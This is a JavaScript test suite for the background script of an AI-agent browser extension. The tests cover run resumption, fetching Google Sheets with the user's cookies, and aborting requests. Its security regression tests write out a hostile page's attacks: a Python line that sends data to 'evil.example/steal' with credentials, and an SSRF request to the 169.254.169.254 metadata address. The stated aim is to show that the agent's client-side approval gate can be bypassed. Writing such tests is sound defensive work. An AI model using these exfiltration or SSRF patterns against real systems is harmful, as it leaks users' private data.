    version: "9.9.9", ts: Date.now(), tabId, messages: [{ role: "user", content: "read the page" }],
    p: {
        runId, task: "read the page", tools: [{ name: "noop", requiresApproval: false, description: "", parameters: {}, capabilities: [] }],
        model: "m", think: null, maxSteps: 5, systemPrompt: "s", surface: "devtools",
        autoApprovePython: false, autoApproveReadonly: false, rebuild: { tools: ["noop"] }, crossPage: true,
    },
    ...over,
});

test("hydrate INVALIDATES a cross-version / stale snapshot on startup (never resumes an old-version zombie)", async () => {
    const bg = loadBackground({
        config: baseConfig(), manifestVersion: "9.9.9",
        onFetch: () => jsonResponse({ choices: [{ message: { content: "ok" } }] }),
        local: {
            ml_bgrun_cur: bgSnap("cur", 5),                                   // current version, fresh → resumable
            ml_bgrun_old: bgSnap("old", 5, { version: "1.0.0" }),            // a PREVIOUS extension version → zombie
            ml_bgrun_stale: bgSnap("stale", 5, { ts: Date.now() - 30 * 60 * 1000 }),   // 30 min old → zombie
            ml_bgrun_legacy: bgSnap("legacy", 5, { version: undefined }),   // un-stamped legacy → zombie
        },
    });
    // A page load drives CONTENT_READY, which awaits the startup hydrate.
    const res = await bg.send({ type: "CONTENT_READY", payload: {} }, { tab: { id: 5 } });
    const ids = (res.adopt || []).map(a => a.runId);
    assert.deepEqual(ids.sort(), ["cur"], "only the current, fresh run is offered for adopt/resume");
    assert.ok("ml_bgrun_cur" in bg.localStore, "the current snapshot survives");
    for (const k of ["ml_bgrun_old", "ml_bgrun_stale", "ml_bgrun_legacy"])
        assert.ok(!(k in bg.localStore), `${k} (a zombie) was deleted from storage`);
});

test("fix C: a RESURRECTED resume re-emits its agent start (visible + stoppable), with the ORIGINAL task", async () => {
    const events = [];
    const bg = loadBackground({
        config: baseConfig(), manifestVersion: "9.9.9",
        onFetch: () => jsonResponse({ choices: [{ message: { content: "resumed and finished" } }] }),
        onTabMessage: (_t, msg) => { if (msg?.type === "ML_DEBUG_TO_PAGE") events.push(msg.event); },
        local: { ml_bgrun_res1: bgSnap("res1", 7) },
    });
    // Page loads → CONTENT_READY offers the interrupted run for auto-resume.
    const ready = await bg.send({ type: "CONTENT_READY", payload: {} }, { tab: { id: 7 } });
    assert.ok((ready.adopt || []).some(a => a.runId === "res1" && a.resume), "the interrupted run is offered with resume:true");
    // The page then RESUME_RUNs it with an EMPTY follow-up (what _adoptRun does on an auto-resume).
    await bg.send({ type: "RESUME_RUN", payload: { runId: "res1", task: "" } }, { tab: { id: 7 } });
    // Before fix C this resume was INVISIBLE (no agent start) — a ghost with no Stop button. Now it re-announces.
    const start = events.find(e => e?.kind === "agent" && e.id === "res1");
    assert.ok(start, "the resurrected resume RE-EMITS an agent start (materialises a row + Stop button)");
    assert.equal(start.task, "read the page", "with the ORIGINAL task, not the empty auto-resume follow-up");
    assert.equal(start.resumed, true, "flagged resumed-after-interruption");
});

test("START_RUN offsets emitted step/seq by stepBase/seqBase and returns the run's extents (multi-turn sidebar)", async () => {
    // A createAgent handle's later turns send stepBase/seqBase so the background's emitted step/seq continue
    // past prior turns — otherwise turn N's step 1 collides with turn 1's and the sidebar chat log scrambles.
    const events = [];
    let n = 0;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => (++n === 1
            ? jsonResponse({ choices: [{ message: { content: "", tool_calls: [{ id: "c1", type: "function", function: { name: "noop", arguments: "{}" } }] } }] })
            : jsonResponse({ choices: [{ message: { content: "done" } }] })),
        onTabMessage: (_t, msg) => {
            if (msg?.type === "ML_DEBUG_TO_PAGE") events.push(msg.event);
            if (msg?.type === "RUN_TOOL_IN_PAGE" && !msg.payload?.renderOnly && !msg.payload?.readonlyTry && !msg.payload?.precheck) return { result: "ok" };
            return undefined;
        },
    });
    const res = await bg.send({ type: "START_RUN", payload: {
        runId: "off1", task: "go", systemPrompt: "S", tools: [{ name: "noop", requiresApproval: false, description: "", parameters: {}, capabilities: [] }],
        model: "m", think: null, maxSteps: 5, autoApprovePython: false, autoApproveReadonly: false, surface: "devtools",
        stepBase: 10, seqBase: 5,
    } }, { tab: { id: 3 } });

    const steps = events.filter(e => e.kind === "agent-step");
    assert.ok(steps.length && steps.every(e => e.step > 10), "every emitted step is offset past stepBase (10)");
    assert.ok(steps.some(e => e.seq != null && e.seq > 5), "the tool step's seq is offset past seqBase (5)");
    // The run's EMITTED extents ride back so the page advances its bases past them (the final-answer step
    // emits no event here → max emitted step is 1, the tool step; one tool call → seq 1).
    assert.equal(res.stepCount, 1, "returns the run's max emitted step");
    assert.equal(res.seqCount, 1, "returns the run's max emitted seq (one tool call)");
});

// ---- FETCH_SHEET: credentialed Google Sheets CSV export ----

test("FETCH_SHEET returns the CSV body, fetched with the user's Google cookies", async () => {
    let opts = null;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => { opts = call.opts; return { ok: true, status: 200, headers: { get: (k) => /content-disposition/i.test(k) ? 'attachment; filename="Quarterly Sales - Sheet1.csv"' : "text/csv" }, text: async () => "Rep,Q1\nAda,120\n" }; },
    });
    const res = await bg.send({ type: "FETCH_SHEET", payload: { url: "https://docs.google.com/spreadsheets/d/A/export?format=csv&gid=0" } });
    assert.equal(res.data.csv, "Rep,Q1\nAda,120\n");
    assert.equal(res.data.name, "Quarterly Sales", "the sheet TITLE from Content-Disposition (tab + .csv stripped)");
    assert.equal(opts.credentials, "include", "credentialed so a private sheet the user can see works");
});

test("FETCH_SHEET_TITLE: a HEAD request returns just the sheet title (spreadsheet name, tab stripped)", async () => {
    let call = null;
    const bg = loadBackground({
        config: baseConfig(),
        // The REAL Google header: a space-STRIPPED ASCII filename= AND the UTF-8 filename* (with spaces).
        // We must prefer filename* — otherwise "quarterly sales" reads as "quarterlysales".
        onFetch: (c) => { call = c; return { ok: true, headers: { get: (k) => /content-disposition/i.test(k) ? `attachment; filename="quarterlysales-Sheet1.csv"; filename*=UTF-8''quarterly%20sales%20-%20Sheet1.csv` : "" }, text: async () => "" }; },
    });
    // The DevTools panel is a top-level extension page → sender.url is our origin, sender.tab is null.
    const panel = { url: "chrome-extension://test/panel.html" };
    const res = await bg.send({ type: "FETCH_SHEET_TITLE", payload: { id: "ABC123_-x" } }, panel);
    assert.equal(res.data, "quarterly sales", "filename* wins (spaces kept), ' - Sheet1' tab stripped — NOT the stripped 'quarterlysales'");
    assert.equal(call.opts.method, "HEAD", "HEAD — headers only, no sheet body downloaded pre-approval");
    assert.equal(call.opts.credentials, "include");
    // The bug: the overlay/off-mode card is our extension-origin IFRAME embedded IN a page tab, so sender.tab
    // is SET but sender.url is our origin. It MUST be allowed (it was wrongly refused → the HUD showed the
    // generic "Google Sheet" instead of the real title).
    const cardIframe = { tab: { id: 5 }, url: "chrome-extension://test/sidebar.html" };
    const inCard = await bg.send({ type: "FETCH_SHEET_TITLE", payload: { id: "ABC123_-x" } }, cardIframe);
    assert.equal(inCard.data, "quarterly sales", "the embedded card iframe (sender.tab set, own origin) still resolves the title");
    // A bad id is refused WITHOUT fetching (the host-locked guard).
    const bad = await bg.send({ type: "FETCH_SHEET_TITLE", payload: { id: "../evil" } }, panel);
    assert.equal(bad.data, null);
});

test("FETCH_SHEET REFUSES a non-Sheets URL without fetching (the credentialed-fetch guard)", async () => {
    // The approval gate is client-side; a hostile page can post FETCH_SHEET raw. This background
    // check is the only thing stopping a cookie-authenticated read of an arbitrary URL.
    let fetched = false;
    const bg = loadBackground({ config: baseConfig(), onFetch: () => { fetched = true; return { ok: true, status: 200, headers: { get: () => "text/csv" }, text: async () => "x" }; } });
    for (const url of ["https://evil.example/steal", "https://docs.google.com/document/d/abc/export", "https://accounts.google.com/o/oauth2/auth"]) {
        const res = await bg.send({ type: "FETCH_SHEET", payload: { url } });
        assert.match(res.error, /only Google Sheets CSV-export URLs/, `refused: ${url}`);
    }
    assert.equal(fetched, false, "no credentialed fetch ever issued for a disallowed URL");
});

test("FETCH_SHEET: an HTML login page (not signed in / no access) → an authenticate-and-retry error", async () => {
    // When the user lacks access, Google redirects the CSV export to an HTML sign-in page.
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => ({ ok: true, status: 200, headers: { get: () => "text/html" }, text: async () => "<!doctype html><html>Sign in</html>" }),
    });
    const res = await bg.send({ type: "FETCH_SHEET", payload: { url: "https://docs.google.com/spreadsheets/d/A/export?format=csv&gid=0" } });
    assert.equal(res.data, undefined);
    assert.match(res.error, /Tell the USER to open the sheet's link/);
});

// ---- SECURITY REGRESSIONS: consent must be enforced at the BACKGROUND choke point, not only the ----
// ---- (bypassable) client-side agent loop. These are `todo` — they encode the DESIRED secure behavior ----
// ---- and FAIL today (demonstrating the live holes). The hardening pass in ----
// ---- docs/spec/CHOKEPOINT_CONSENT_SPEC.md makes them pass; drop `todo` then. See background.ts. ----

test("SECURITY (FETCH_SHEET): a non-whitelisted page must NOT read an arbitrary sheet, credentialed, unapproved", async () => {
    // THE HOLE (this test fails today): the SHEET_URL_OK host-lock stops general SSRF, but within the
    // Google-Sheets shape the ID is page-controlled and the fetch is credentialed — so a hostile page that
    // knows a private sheet's id exfiltrates it with the user's cookies, with NO unforgeable approval (the
    // per-sheet grant lives only in the client-side loop). The fix must REFUSE this and never send cookies.
    let opts = null;
    const bg = loadBackground({
        config: baseConfig(),   // evil.example is NOT in pageApprovalDomains
        onFetch: (c) => { opts = c.opts; return { ok: true, status: 200, headers: { get: (k) => /content-disposition/i.test(k) ? 'attachment; filename="Private Budget - Sheet1.csv"' : "text/csv" }, text: async () => "Name,SSN\nAda,111-22-3333\n" }; },
    });
    const res = await bg.send(
        { type: "FETCH_SHEET", payload: { url: "https://docs.google.com/spreadsheets/d/VICTIM_SHEET_ID/export?format=csv&gid=0" } },
        { tab: { id: 9, url: "https://evil.example/attack" } });   // sender.tab set = a page; origin NOT whitelisted, sheet NOT approved
    assert.ok(res.error && /not (approved|whitelisted)|refus|consent/i.test(res.error),
        `a non-whitelisted page with an unapproved sheet must be refused — today it leaked: ${JSON.stringify(res.data)}`);
    assert.notEqual(opts?.credentials, "include", "must not spend the user's Google cookies on an unapproved sheet");
});

test("SECURITY (PYTHON_EXEC): a non-whitelisted page must NOT get FULL (unhardened, networked) mode", async () => {
    // THE HOLE (this test fails today): `hardened:false` from a page runs the offscreen worker UNHARDENED —
    // js + network bridge, at the EXTENSION origin (<all_urls> → CORS-bypassing, credential-capable fetch),
    // strictly more powerful than any other tool. "Full mode needs approval" is enforced only in the
    // bypassable client-side loop; the choke point trusts the message's `hardened` flag. The fix must force
    // hardened:true for a non-whitelisted page (full mode reachable only from a trusted surface / whitelist).
    const bg = loadBackground({ config: baseConfig() });   // evil.example NOT whitelisted
    await bg.send(
        { type: "PYTHON_EXEC", payload: { code: "import js; js.fetch('https://evil.example/steal', {credentials:'include'})", hardened: false } },
        { tab: { id: 9, url: "https://evil.example/attack" } });   // sender.tab set = a page
    // The fix rejects with an auth error (no PY_RUN sent) — or at worst runs hardened. Either way, NO
    // unhardened run may reach the sandbox. Today one does (hardened:false), so this fails = the hole.
    const unhardened = bg.pyRuns.find(m => m.type === "PY_RUN" && m.hardened === false);
    assert.ok(!unhardened, "a non-whitelisted page must NOT get an unhardened run — today it does");
});

test("SECURITY (FETCH_SHEET_TITLE): internal-only — a page (sender.tab set) must be refused", async () => {
    // The handler even comments "a page can't send this" but never ENFORCES it. A page (bypassing the
    // relay, or via a future relay entry) currently learns a private sheet's TITLE by id, credentialed.
    let fetched = false;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => { fetched = true; return { ok: true, headers: { get: (k) => /content-disposition/i.test(k) ? 'attachment; filename="Victim Secret Roadmap - Q3.csv"' : "" }, text: async () => "" }; },
    });
    const res = await bg.send(
        { type: "FETCH_SHEET_TITLE", payload: { id: "VICTIM_SHEET_ID" } },
        { tab: { id: 9 }, url: "https://evil.example/attack" });   // a page/content-script: sender.url is the WEB origin
    assert.equal(fetched, false, "must not spend the user's cookies on a title for a page");
    assert.equal(res.data, null, "a page (non-extension origin) must not learn a sheet's title");
});

test("SECURITY (FETCH_IMAGE_B64): must refuse internal/loopback/metadata targets (SSRF)", async () => {
    // Uncredentialed, so no auth-data leak — but it's a "read any URL's bytes" primitive at the extension
    // origin, so a page can probe/read the user's INTERNAL network. Private/metadata hosts must be refused.
    let fetched = false;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => { fetched = true; return { ok: true, status: 200, blob: async () => ({}) }; },
    });
    await bg.send(
        { type: "FETCH_IMAGE_B64", payload: { url: "http://169.254.169.254/latest/meta-data/" } },
        { tab: { id: 9, url: "https://evil.example/attack" } });
    assert.equal(fetched, false, "must NOT fetch an internal/metadata URL — today it does (SSRF)");
});

test("SECURITY (positive): a TRUSTED surface (sender.tab undefined) keeps full python", async () => {
    // Guard against over-blocking: internal extension surfaces (popup / offscreen / a future REPL) must
    // still get unhardened mode. This passes today and must keep passing after the hardening pass.
    const bg = loadBackground({ config: baseConfig() });
    await bg.send({ type: "PYTHON_EXEC", payload: { code: "1+1", hardened: false } });   // no sender.tab
    assert.equal(bg.pyRuns.find(m => m.type === "PY_RUN")?.hardened, false, "trusted surface may run full mode");
});

test("SECURITY (grant): an approved agent run lets THAT sheet read (untrusted page) mid-run, then clears", async () => {
    // End-to-end: a design-A run's python_exec (approved in the iframe) mints a per-sheet grant in
    // delegateTool; the page's FETCH_SHEET during that delegation succeeds — but a DIFFERENT sheet is
    // still refused, and after the run the grant is gone. Proves the fix DOESN'T break the agent flow.
    const TAB = 7, PAGE = { tab: { id: TAB, url: "https://untrusted.example/x" } };
    const OK_URL = "https://docs.google.com/spreadsheets/d/APPROVED_SHEET_A/export?format=csv&gid=0";
    const OTHER_URL = "https://docs.google.com/spreadsheets/d/OTHER_SHEET_B/export?format=csv&gid=0";
    const sheetCsv = () => ({ ok: true, status: 200, headers: { get: (k) => /content-disposition/i.test(k) ? 'attachment; filename="S - Sheet1.csv"' : "text/csv" }, text: async () => "A\n1\n" });
    let approvedRead, otherRead;
    let turn = 0;
    const bg = loadBackground({
        config: baseConfig(),   // untrusted.example NOT whitelisted
        onFetch: (call) => {
            if (call.url.includes("docs.google.com")) return sheetCsv();   // the FETCH_SHEET's credentialed fetch
            // The model: turn 1 → call python_exec(full) loading the sheet; turn 2 → finish.
            return (++turn === 1)
                ? jsonResponse({ choices: [{ finish_reason: "tool_calls", message: { content: null, tool_calls: [{ id: "c1", type: "function", function: { name: "python_exec", arguments: JSON.stringify({ code: "df", mode: "full", tables: { df: OK_URL } }) } }] } }] })
                : jsonResponse({ choices: [{ message: { content: "done" } }] });
        },
        onTabMessage: async (tabId, msg) => {
            // Approve the pending python_exec gate the instant it surfaces (the iframe's role).
            if (msg?.type === "ML_DEBUG_TO_PAGE" && msg.event?.awaitingApproval) {
                void bg.send({ type: "SET_APPROVAL", payload: { runId: msg.event.id, seq: msg.event.seq, decision: true } });
                return;
            }
            // The APPROVED delegation (not the renderOnly preview) — grant is active now.
            if (msg?.type === "RUN_TOOL_IN_PAGE" && msg.payload?.name === "python_exec" && !msg.payload?.renderOnly && !msg.payload?.precheck && !msg.payload?.readonlyTry) {
                approvedRead = await bg.send({ type: "FETCH_SHEET", payload: { url: OK_URL } }, PAGE);
                otherRead = await bg.send({ type: "FETCH_SHEET", payload: { url: OTHER_URL } }, PAGE);   // different sheet → refused
                return { result: "ran python" };
            }
            return undefined;
        },
    });
    await bg.send({ type: "START_RUN", payload: {
        runId: "grun", task: "read the sheet", systemPrompt: "sys",
        tools: [{ name: "python_exec", description: "run python", parameters: { type: "object", properties: {} }, requiresApproval: true, capabilities: [], precheck: false }],
        model: "m", think: null, maxSteps: 4, autoApprovePython: false, autoApproveReadonly: false, surface: "off",
    } }, PAGE);

    assert.ok(approvedRead?.data?.csv, `the APPROVED sheet read during the run (got ${JSON.stringify(approvedRead)})`);
    assert.ok(otherRead?.error, "a DIFFERENT sheet is still refused (grant is bound to the approved id)");
    // After the delegation, the grant is cleared → a later read of even the approved sheet is refused.
    const afterRead = await bg.send({ type: "FETCH_SHEET", payload: { url: OK_URL } }, PAGE);
    assert.ok(afterRead?.error, "the grant is one-time: after the run, the same sheet is refused again");
});

// ---- ABORT_TASK: cancel an in-flight FETCH_LLM (ml.agent's signal → killed generation) ----

test("ABORT_TASK aborts the in-flight FETCH_LLM fetch for its requestId (kills a slow generation)", async () => {
    let sawSignal = false;
    const bg = loadBackground({
        config: baseConfig(),
        // A fetch that honours the AbortSignal like the real one: hang until aborted, then reject —
        // and reject immediately if the signal is ALREADY aborted (a listener added post-abort never fires).
        onFetch: (call) => new Promise((_, reject) => {
            sawSignal = !!call.opts.signal;
            const abort = () => { const e = new Error("aborted by signal"); e.name = "AbortError"; reject(e); };
            if (call.opts.signal.aborted) return abort();
            call.opts.signal.addEventListener("abort", abort);
        }),
    });
    const pending = bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] }, requestId: "r1" });
    await new Promise(r => setTimeout(r, 0));   // let the fetch get in-flight before we abort it
    bg.send({ type: "ABORT_TASK", payload: { requestId: "r1" } });   // fire-and-forget (no response)
    const res = await pending;
    assert.equal(sawSignal, true, "the FETCH_LLM fetch received an AbortSignal");
    assert.match(res.error, /abort/i, "aborting the task rejects the in-flight request");
});

test("ABORT_TASK for an unknown requestId is a harmless no-op", async () => {
    const bg = loadBackground({ config: baseConfig(), onFetch: () => jsonResponse({ choices: [{ message: { content: "ok" } }] }) });
    // No throw, nothing to abort.
    bg.send({ type: "ABORT_TASK", payload: { requestId: "nope" } });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] }, requestId: "r2" });
    assert.equal(res.data, "ok", "a later request is unaffected");
});

test("LLM_STREAM: disconnecting the Port aborts the streaming fetch (ml.chat's signal → killed generation)", async () => {
    let sawSignal = false, aborted = false;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => new Promise((_, reject) => {
            sawSignal = !!call.opts.signal;
            const abort = () => { aborted = true; const e = new Error("aborted"); e.name = "AbortError"; reject(e); };
            if (call.opts.signal.aborted) return abort();
            call.opts.signal.addEventListener("abort", abort);
        }),
    });
    const port = bg.connect("LLM_STREAM");
    port.send({ payload: { messages: [{ role: "user", content: "hi" }] } });   // starts streamLLM
    await new Promise(r => setTimeout(r, 0));   // let streamLLM reach the in-flight fetch
    port.disconnect();                          // content.js disconnects the port on abort
    await new Promise(r => setTimeout(r, 0));
    assert.equal(sawSignal, true, "the streaming fetch received an AbortSignal");
    assert.equal(aborted, true, "disconnecting the port aborted the fetch");
});
